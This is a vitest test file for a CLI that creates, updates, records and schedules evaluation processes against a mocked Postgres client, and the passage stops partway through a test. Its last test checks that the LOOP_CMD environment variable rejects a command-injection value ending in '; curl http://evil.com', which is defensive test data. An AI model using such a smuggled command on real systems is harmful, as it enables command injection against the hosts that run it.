import { describe, it, expect, vi, beforeEach, afterEach, beforeAll } from 'vitest'
import * as fs from 'fs'
import * as path from 'path'
import * as os from 'os'

const { fakeExecFileSync, fakeHomedir, fakeReadFileSync, fakeMkdirSync, fakeWriteFileSync, fakeRenameSync, fakeGetLocalSubUnchecked, realReadFileSync, realMkdirSync, realWriteFileSync, realRenameSync } = vi.hoisted(() => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const realFs = require('fs') as typeof import('fs')
  const realReadFileSync = realFs.readFileSync.bind(realFs)
  const realMkdirSync = realFs.mkdirSync.bind(realFs)
  const realWriteFileSync = realFs.writeFileSync.bind(realFs)
  const realRenameSync = realFs.renameSync.bind(realFs)
  return {
    fakeExecFileSync: vi.fn(),
    fakeHomedir: vi.fn(() => '/fake-home'),
    fakeReadFileSync: vi.fn((...args: Parameters<typeof realFs.readFileSync>) => realReadFileSync(...(args as Parameters<typeof realFs.readFileSync>))),
    fakeMkdirSync: vi.fn((...args: Parameters<typeof realFs.mkdirSync>) => realMkdirSync(...(args as Parameters<typeof realFs.mkdirSync>))),
    fakeWriteFileSync: vi.fn((...args: Parameters<typeof realFs.writeFileSync>) => realWriteFileSync(...(args as Parameters<typeof realFs.writeFileSync>))),
    fakeRenameSync: vi.fn((...args: Parameters<typeof realFs.renameSync>) => realRenameSync(...(args as Parameters<typeof realFs.renameSync>))),
    fakeGetLocalSubUnchecked: vi.fn(() => null as string | null),
    realReadFileSync,
    realMkdirSync,
    realWriteFileSync,
    realRenameSync,
  }
})
vi.mock('child_process', () => ({
  execFileSync: fakeExecFileSync,
}))
vi.mock('node:os', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:os')>()
  return {
    ...actual,
    default: { ...actual, homedir: fakeHomedir },
    homedir: fakeHomedir,
  }
})
vi.mock('fs', async (importOriginal) => {
  const actual = await importOriginal<typeof import('fs')>()
  return {
    ...actual,
    readFileSync: fakeReadFileSync,
    mkdirSync: fakeMkdirSync,
    writeFileSync: fakeWriteFileSync,
    renameSync: fakeRenameSync,
  }
})

vi.mock('dotenv/config', () => ({}))

vi.mock('../lib/identity.js', () => ({
  getLocalSubUnchecked: fakeGetLocalSubUnchecked,
  getLocalSub: vi.fn(() => null),
  parseJwtSub: vi.fn(() => null),
  parseJwtSubUnchecked: vi.fn(() => null),
  readLocalToken: vi.fn(() => null),
}))

beforeAll(() => {
  process.env.DATABASE_URL = 'postgres://mock:mock@localhost/mock'
})

const fakeTx = vi.fn()
const fakeSql = Object.assign(vi.fn(), {
  json: (v: unknown) => v,
  end: vi.fn(),
  begin: vi.fn(async (cb: (tx: typeof fakeTx) => Promise<unknown>) => cb(fakeTx)),
})
vi.mock('postgres', () => ({
  default: vi.fn(() => fakeSql)
}))
vi.mock('@skill-networks/database/client', () => ({
  getSqlClient: () => fakeSql,
  closeSqlClient: vi.fn(),
}))

import { processCommand } from '../commands/process.js'
import { setAdapter, clearAdapter } from '../lib/adapter-factory.js'
import { PostgresOntologyAdapter } from '../adapters/postgres-ontology-adapter.js'

describe('process init', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    vi.restoreAllMocks()
  })

  it('creates a new process and prints the ID', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([{ id: processId }]) // INSERT RETURNING

    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test-campaign', '--unlinked'], { from: 'user' })

    expect(logs.join('\n')).toContain(processId)
  })

  it('two inits with the same name each return a new distinct ID', async () => {
    const processId1 = '550e8400-e29b-41d4-a716-446655440001'
    const processId2 = '550e8400-e29b-41d4-a716-446655440002'

    // First init
    fakeSql.mockResolvedValueOnce([{ id: processId1 }])
    const cmd1 = processCommand()
    await cmd1.parseAsync(['init', '--name', 'test-campaign', '--unlinked'], { from: 'user' })
    expect(logs.join('\n')).toContain(processId1)

    logs.length = 0

    // Second init — no constraint conflict, just a new INSERT
    fakeSql.mockResolvedValueOnce([{ id: processId2 }])
    const cmd2 = processCommand()
    await cmd2.parseAsync(['init', '--name', 'test-campaign', '--unlinked'], { from: 'user' })
    expect(logs.join('\n')).toContain(processId2)

    expect(processId1).not.toBe(processId2)
  })

  it('re-throws unexpected DB errors', async () => {
    fakeSql
      .mockRejectedValueOnce(new Error('connection refused'))

    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test-campaign', '--unlinked'], { from: 'user' })

    expect(errors.join('\n')).toContain('connection refused')
    expect(process.exitCode).toBe(1)
  })

  it('rejects init without --skill-resource-id unless --unlinked is passed', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test-no-skill'], { from: 'user' })

    expect(errors.join('\n')).toContain('--skill-resource-id is required')
    expect(process.exitCode).toBe(1)
  })

  it('rejects invalid skill-resource-id', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test', '--skill-resource-id', 'not-a-uuid'], { from: 'user' })

    expect(errors.join('\n')).toContain('valid UUID')
    expect(process.exitCode).toBe(1)
  })

  it('rejects invalid run-type', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test', '--run-type', 'invalid', '--unlinked'], { from: 'user' })

    expect(errors.join('\n')).toContain('--run-type')
    expect(process.exitCode).toBe(1)
  })
})

describe('process status', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    vi.restoreAllMocks()
  })

  it('errors when neither --name nor --id is provided', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['status'], { from: 'user' })

    expect(errors.join('\n')).toContain('--name or --id')
    expect(process.exitCode).toBe(1)
  })

  it('rejects invalid --id UUID', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['status', '--id', 'not-uuid'], { from: 'user' })

    expect(errors.join('\n')).toContain('valid UUID')
    expect(process.exitCode).toBe(1)
  })

  it('errors when process not found', async () => {
    fakeSql
      .mockResolvedValueOnce([]) // process lookup

    const cmd = processCommand()
    await cmd.parseAsync(['status', '--name', 'nonexistent'], { from: 'user' })

    expect(errors.join('\n')).toContain('Process not found')
    expect(process.exitCode).toBe(1)
  })

  it('outputs JSON when --json flag is set', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([{
        id: processId,
        name: 'test-campaign',
        status: 'active',
        current_epoch: 5,
        metrics: { score: 0.8 },
        updated_at: new Date('2025-06-01T12:00:00Z'),
        branch: 'eval-run/42',
        training_resource_id: null,
      }])
      .mockResolvedValueOnce([]) // recent epochs

    const cmd = processCommand()
    await cmd.parseAsync(['status', '--id', processId, '--json'], { from: 'user' })

    const parsed = JSON.parse(logs[0])
    expect(parsed.id).toBe(processId)
    expect(parsed.name).toBe('test-campaign')
    expect(parsed.status).toBe('active')
    expect(parsed.currentEpoch).toBe(5)
    expect(parsed.branch).toBe('eval-run/42')
  })

  it('includes resumeContext in JSON output when resume_context is set', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    const resumeCtx = JSON.stringify({
      worktree_path: '/root/dispatch/test',
      loop_cmd: 'echo test',
      epoch: 3,
      written_at: '2026-03-17T00:00:00Z'
    })
    fakeSql
      .mockResolvedValueOnce([{
        id: processId,
        name: 'test-wake',
        status: 'waiting',
        current_epoch: 3,
        metrics: null,
        updated_at: new Date('2025-06-01T12:00:00Z'),
        branch: 'boot/test',
        training_resource_id: null,
        resume_at: new Date('2026-03-17T01:00:00Z'),
        worktree_path: '/root/dispatch/test',
        resume_context: resumeCtx,
      }])
      .mockResolvedValueOnce([]) // recent epochs

    const cmd = processCommand()
    await cmd.parseAsync(['status', '--id', processId, '--json'], { from: 'user' })

    const parsed = JSON.parse(logs[0])
    expect(parsed.resumeContext).toBeDefined()
    expect(parsed.resumeContext.worktree_path).toBe('/root/dispatch/test')
    expect(parsed.resumeContext.loop_cmd).toBe('echo test')
    expect(parsed.resumeContext.epoch).toBe(3)
  })

  it('shows resumeContext as null when resume_context is not set', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([{
        id: processId,
        name: 'test-no-ctx',
        status: 'active',
        current_epoch: 1,
        metrics: null,
        updated_at: new Date('2025-06-01T12:00:00Z'),
        branch: null,
        training_resource_id: null,
        resume_at: null,
        worktree_path: null,
        resume_context: null,
      }])
      .mockResolvedValueOnce([]) // recent epochs

    const cmd = processCommand()
    await cmd.parseAsync(['status', '--id', processId, '--json'], { from: 'user' })

    const parsed = JSON.parse(logs[0])
    expect(parsed.resumeContext).toBeNull()
  })

  it('displays human-readable output by default', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([{
        id: processId,
        name: 'test-campaign',
        status: 'active',
        current_epoch: 3,
        metrics: null,
        updated_at: null,
        branch: null,
        training_resource_id: null,
      }])
      .mockResolvedValueOnce([]) // recent epochs

    const cmd = processCommand()
    await cmd.parseAsync(['status', '--name', 'test-campaign'], { from: 'user' })

    const output = logs.join('\n')
    expect(output).toContain('test-campaign')
    expect(output).toContain(processId)
    expect(output).toContain('active')
  })
})

describe('process record', () => {
  let tmpDir: string
  let workspaceDir: string
  let logs: string[]
  let errors: string[]
  let warns: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-core-process-test-'))
    workspaceDir = path.join(tmpDir, 'workspace')
    logs = []
    errors = []
    warns = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    vi.spyOn(console, 'warn').mockImplementation((...args) => warns.push(args.join(' ')))
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    fs.rmSync(tmpDir, { recursive: true, force: true })
    vi.restoreAllMocks()
  })

  it('errors when neither --name nor --id is provided', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['record', '--workspace', workspaceDir], { from: 'user' })

    expect(errors.join('\n')).toContain('--name or --id')
    expect(process.exitCode).toBe(1)
  })

  it('errors when process not found', async () => {
    fakeSql.mockResolvedValueOnce([]) // process lookup

    const cmd = processCommand()
    await cmd.parseAsync(['record', '--name', 'nonexistent', '--workspace', workspaceDir], { from: 'user' })

    expect(errors.join('\n')).toContain('Process not found')
    expect(process.exitCode).toBe(1)
  })

  it('handles missing epochs/ directory gracefully', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['record', '--name', 'test', '--workspace', workspaceDir], { from: 'user' })

    expect(logs.join('\n')).toContain('No epochs/')
  })

  it('uploads epoch.json and updates aggregate', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    const epochDir = path.join(workspaceDir, 'epochs', '3')
    fs.mkdirSync(epochDir, { recursive: true })
    fs.writeFileSync(
      path.join(epochDir, 'epoch.json'),
      JSON.stringify({ metrics: { score: 0.8 } }),
    )

    fakeSql
      .mockResolvedValueOnce([{ id: processId }]) // process lookup
      .mockResolvedValueOnce(undefined) // upsert epoch
      .mockResolvedValueOnce([{ epoch_number: 3, metrics: { score: 0.8 } }]) // aggregate fetch
      .mockResolvedValueOnce(undefined) // update processes

    const cmd = processCommand()
    await cmd.parseAsync(['record', '--name', 'test', '--workspace', workspaceDir], { from: 'user' })

    const output = logs.join('\n')
    expect(output).toContain('epoch=3')
    expect(output).toContain('Done')
  })

  it('skips malformed epoch.json without aborting', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    const epochDir = path.join(workspaceDir, 'epochs', '1')
    fs.mkdirSync(epochDir, { recursive: true })
    fs.writeFileSync(path.join(epochDir, 'epoch.json'), 'not valid json')

    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['record', '--name', 'test', '--workspace', workspaceDir], { from: 'user' })

    // Warning is now gated behind DUOIDAL_DEBUG structured logging —
    // verify graceful handling (no abort, no exitCode=1)
    expect(process.exitCode).not.toBe(1)
  })

  it('rejects invalid --epoch value', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    // Create the epochs directory so it doesn't return early
    fs.mkdirSync(path.join(workspaceDir, 'epochs'), { recursive: true })

    const cmd = processCommand()
    await cmd.parseAsync(['record', '--name', 'test', '--workspace', workspaceDir, '--epoch', 'abc'], { from: 'user' })

    expect(errors.join('\n')).toContain('non-negative integer')
    expect(process.exitCode).toBe(1)
  })

  it('passes --session-id, --cost, --duration-ms into the upsert call', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    const epochDir = path.join(workspaceDir, 'epochs', '5')
    fs.mkdirSync(epochDir, { recursive: true })
    fs.writeFileSync(
      path.join(epochDir, 'epoch.json'),
      JSON.stringify({ metrics: { score: 0.9 } }),
    )

    fakeSql
      .mockResolvedValueOnce([{ id: processId }]) // process lookup
      .mockResolvedValueOnce(undefined) // upsert epoch
      .mockResolvedValueOnce([{ epoch_number: 5 }]) // aggregate fetch
      .mockResolvedValueOnce(undefined) // update processes

    const cmd = processCommand()
    await cmd.parseAsync(
      [
        'record', '--name', 'test', '--workspace', workspaceDir,
        '--session-id', 'sess-abc-123',
        '--cost', '0.042',
        '--duration-ms', '12345',
      ],
      { from: 'user' },
    )

    expect(errors).toHaveLength(0)
    expect(process.exitCode).not.toBe(1)

    // The second fakeSql call is the INSERT INTO epoch_results upsert.
    // In a tagged template, call[0] is the strings array and call[1..] are the interpolated values.
    // Value order matches the INSERT VALUES clause:
    //   processId, epochNumber, stateSnapshot, startedAt, now, cost, durationMs, sessionId
    const upsertCall = fakeSql.mock.calls[1]
    const upsertValues = upsertCall.slice(1) // interpolated args
    expect(upsertValues[5]).toBe(0.042)        // cost
    expect(upsertValues[6]).toBe(12345)        // duration_ms
    expect(upsertValues[7]).toBe('sess-abc-123') // session_id
  })

  it('rejects non-numeric --cost', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }])
    fs.mkdirSync(path.join(workspaceDir, 'epochs'), { recursive: true })

    const cmd = processCommand()
    await cmd.parseAsync(
      ['record', '--name', 'test', '--workspace', workspaceDir, '--cost', 'abc'],
      { from: 'user' },
    )

    expect(errors.join('\n')).toContain('--cost must be a non-negative finite number')
    expect(process.exitCode).toBe(1)
  })

  it('rejects non-numeric --duration-ms', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }])
    fs.mkdirSync(path.join(workspaceDir, 'epochs'), { recursive: true })

    const cmd = processCommand()
    await cmd.parseAsync(
      ['record', '--name', 'test', '--workspace', workspaceDir, '--duration-ms', 'xyz'],
      { from: 'user' },
    )

    expect(errors.join('\n')).toContain('--duration-ms must be a non-negative finite number')
    expect(process.exitCode).toBe(1)
  })
})

describe('process active', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    vi.restoreAllMocks()
  })

  it('sets status to active when process is not already active', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }]) // update returns the row

    const cmd = processCommand()
    await cmd.parseAsync(['active', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('is idempotent when process is already active (empty update result)', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([]) // update returns empty (already active)
      .mockResolvedValueOnce([{ id: processId, status: 'active' }]) // existence check

    const cmd = processCommand()
    await cmd.parseAsync(['active', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('errors when process not found', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([]) // update returns empty
      .mockResolvedValueOnce([]) // existence check: not found

    const cmd = processCommand()
    await cmd.parseAsync(['active', '--id', processId], { from: 'user' })

    expect(errors.join('\n')).toContain('Process not found')
    expect(process.exitCode).toBe(1)
  })

  it('rejects invalid UUID', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['active', '--id', 'not-a-uuid'], { from: 'user' })

    expect(errors.join('\n')).toContain('valid UUID')
    expect(process.exitCode).toBe(1)
  })
})

describe('process complete', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    vi.restoreAllMocks()
  })

  it('sets status to completed', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }]) // update returns the row

    const cmd = processCommand()
    await cmd.parseAsync(['complete', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('is idempotent when process is already completed', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([]) // update returns empty (already completed)
      .mockResolvedValueOnce([{ id: processId, status: 'completed' }]) // existence check

    const cmd = processCommand()
    await cmd.parseAsync(['complete', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('degrades gracefully when completed_at column does not exist', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockRejectedValueOnce(new Error('column "completed_at" does not exist')) // first try fails
      .mockResolvedValueOnce([{ id: processId }]) // fallback update succeeds

    const cmd = processCommand()
    await cmd.parseAsync(['complete', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('errors when process not found', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([]) // update empty
      .mockResolvedValueOnce([]) // not found

    const cmd = processCommand()
    await cmd.parseAsync(['complete', '--id', processId], { from: 'user' })

    expect(errors.join('\n')).toContain('Process not found')
    expect(process.exitCode).toBe(1)
  })

  it('rejects invalid UUID', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['complete', '--id', 'not-a-uuid'], { from: 'user' })

    expect(errors.join('\n')).toContain('valid UUID')
    expect(process.exitCode).toBe(1)
  })
})

describe('process fail', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    vi.restoreAllMocks()
  })

  it('sets status to failed without reason', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }]) // update returns the row

    const cmd = processCommand()
    await cmd.parseAsync(['fail', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('sets status to failed with reason when column exists', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql.mockResolvedValueOnce([{ id: processId }]) // update with reason succeeds

    const cmd = processCommand()
    await cmd.parseAsync(['fail', '--id', processId, '--reason', 'timeout'], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('degrades gracefully when failure_reason column does not exist', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockRejectedValueOnce(new Error('column "failure_reason" does not exist')) // first try fails
      .mockResolvedValueOnce([{ id: processId }]) // fallback update succeeds

    const cmd = processCommand()
    await cmd.parseAsync(['fail', '--id', processId, '--reason', 'timeout'], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('is idempotent when process is already failed', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([]) // update returns empty (already failed)
      .mockResolvedValueOnce([{ id: processId, status: 'failed' }]) // existence check

    const cmd = processCommand()
    await cmd.parseAsync(['fail', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
  })

  it('errors when process not found', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([]) // update empty
      .mockResolvedValueOnce([]) // not found

    const cmd = processCommand()
    await cmd.parseAsync(['fail', '--id', processId], { from: 'user' })

    expect(errors.join('\n')).toContain('Process not found')
    expect(process.exitCode).toBe(1)
  })

  it('rejects invalid UUID', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['fail', '--id', 'not-a-uuid'], { from: 'user' })

    expect(errors.join('\n')).toContain('valid UUID')
    expect(process.exitCode).toBe(1)
  })
})

describe('process sleep', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    fakeTx.mockReset()
    // Re-attach begin after mockReset
    fakeSql.begin = vi.fn(async (cb: (tx: typeof fakeTx) => Promise<unknown>) => cb(fakeTx))
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    delete process.env.EVAL_PROCESS_ID
    delete process.env.EVAL_CAMPAIGN_ID
    vi.restoreAllMocks()
  })

  it('sleep command is registered and --interval flag is documented', async () => {
    const stdoutChunks: string[] = []
    const originalWrite = process.stdout.write.bind(process.stdout)
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      stdoutChunks.push(String(chunk))
      return true
    })

    const cmd = processCommand()
    try {
      await cmd.parseAsync(['sleep', '--help'], { from: 'user' })
    } catch {
      // Commander may call process.exit(0) on --help
    }

    process.stdout.write = originalWrite

    const output = [...stdoutChunks, ...logs, ...errors].join('\n')
    expect(output).toContain('--interval')
    expect(process.exitCode).not.toBe(1)
  })

  it('errors when neither EVAL_PROCESS_ID nor EVAL_CAMPAIGN_ID is set', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', '30 minutes'], { from: 'user' })

    expect(errors.join('\n')).toContain('EVAL_PROCESS_ID')
    expect(process.exitCode).toBe(1)
  })

  it('errors when EVAL_PROCESS_ID is not a valid UUID', async () => {
    process.env.EVAL_PROCESS_ID = 'not-a-uuid'

    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', '30 minutes'], { from: 'user' })

    expect(errors.join('\n')).toContain('valid UUID')
    expect(process.exitCode).toBe(1)
  })

  it('errors when interval is not a valid duration', async () => {
    process.env.EVAL_PROCESS_ID = '550e8400-e29b-41d4-a716-446655440000'

    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', 'invalid-interval'], { from: 'user' })

    expect(errors.join('\n')).toContain('--interval')
    expect(process.exitCode).toBe(1)
  })

  it('logs sleeping until when update succeeds', async () => {
    process.env.EVAL_PROCESS_ID = '550e8400-e29b-41d4-a716-446655440000'
    // getById call — returns row with worktree_path
    fakeSql.mockResolvedValueOnce([{
      id: '550e8400-e29b-41d4-a716-446655440000', status: 'active',
      worktree_path: '/tmp/no-such-worktree',
      resume_context: null, resume_at: null, root_process_id: null,
      channel_id: null, skill_resource_id: null, name: 'test-proc',
      parent_process_id: null, branch: null, training_resource_id: null, run_type: null,
    }])
    // Transaction: SELECT guard, segment count, UPDATE, INSERT
    fakeTx
      .mockResolvedValueOnce([{  // SELECT guard inside tx
        id: '550e8400-e29b-41d4-a716-446655440000', status: 'active',
        root_process_id: '550e8400-e29b-41d4-a716-446655440000',
        channel_id: null, skill_resource_id: null, name: 'test-proc',
        parent_process_id: null, branch: null, training_resource_id: null, run_type: null,
      }])
      .mockResolvedValueOnce([{ cnt: 1 }])  // count segments
      .mockResolvedValueOnce([{ id: '550e8400-e29b-41d4-a716-446655440000' }])  // UPDATE RETURNING id
      .mockResolvedValueOnce([{ id: 'new-seg-id', resume_at: new Date('2026-03-15T00:00:00Z') }])  // INSERT RETURNING

    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', '1 hour'], { from: 'user' })

    const output = logs.join('\n')
    expect(output).toContain('sleeping until')
    expect(output).toContain('2026-03-15')
    expect(process.exitCode).not.toBe(1)
  })

  it('errors when process not found via getById', async () => {
    process.env.EVAL_PROCESS_ID = '550e8400-e29b-41d4-a716-446655440000'
    // getById returns empty — not found
    fakeSql.mockResolvedValueOnce([])

    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', '1 hour'], { from: 'user' })

    expect(errors.join('\n')).toContain('Process not found')
    expect(process.exitCode).toBe(1)
  })

  it('errors when DB row has no worktree_path', async () => {
    process.env.EVAL_PROCESS_ID = '550e8400-e29b-41d4-a716-446655440000'
    // getById returns row with null worktree_path
    fakeSql.mockResolvedValueOnce([{
      id: '550e8400-e29b-41d4-a716-446655440000', status: 'active',
      worktree_path: null,
      resume_context: null, resume_at: null, root_process_id: null,
      channel_id: null, skill_resource_id: null, name: 'test-proc',
    }])

    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', '30 minutes'], { from: 'user' })

    expect(errors.join('\n')).toContain('worktree_path')
    expect(process.exitCode).toBe(1)
  })

  it('succeeds with worktree_path from DB row (no WORKTREE_PATH env needed)', async () => {
    process.env.EVAL_PROCESS_ID = '550e8400-e29b-41d4-a716-446655440000'
    // No WORKTREE_PATH or LOOP_CMD in env — should still work
    // getById returns row with worktree_path
    fakeSql.mockResolvedValueOnce([{
      id: '550e8400-e29b-41d4-a716-446655440000', status: 'active',
      worktree_path: '/tmp/no-such-worktree',
      resume_context: null, resume_at: null, root_process_id: null,
      channel_id: null, skill_resource_id: null, name: 'test-proc',
      parent_process_id: null, branch: null, training_resource_id: null, run_type: null,
    }])
    // Transaction: SELECT guard, segment count, UPDATE, INSERT
    fakeTx
      .mockResolvedValueOnce([{
        id: '550e8400-e29b-41d4-a716-446655440000', status: 'active',
        root_process_id: '550e8400-e29b-41d4-a716-446655440000',
        channel_id: null, skill_resource_id: null, name: 'test-proc',
        parent_process_id: null, branch: null, training_resource_id: null, run_type: null,
      }])
      .mockResolvedValueOnce([{ cnt: 1 }])
      .mockResolvedValueOnce([{ id: '550e8400-e29b-41d4-a716-446655440000' }])
      .mockResolvedValueOnce([{ id: 'new-seg-id', resume_at: new Date('2026-03-15T00:00:00Z') }])

    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', '1 hour'], { from: 'user' })

    const output = logs.join('\n')
    expect(output).toContain('sleeping until')
    expect(process.exitCode).not.toBe(1)
  })

  it('errors when LOOP_CMD contains shell metacharacters', async () => {
    process.env.EVAL_PROCESS_ID = '550e8400-e29b-41d4-a716-446655440000'
    process.env.LOOP_CMD = 'npx tsx utils/loop/index.ts; curl http://evil.com'
    // getById returns row with worktree_path
    fakeSql.mockResolvedValueOnce([{
      id: '550e8400-e29b-41d4-a716-446655440000', status: 'active',
      worktree_path: '/tmp/no-such-worktree',
      resume_context: null, resume_at: null, root_process_id: null,
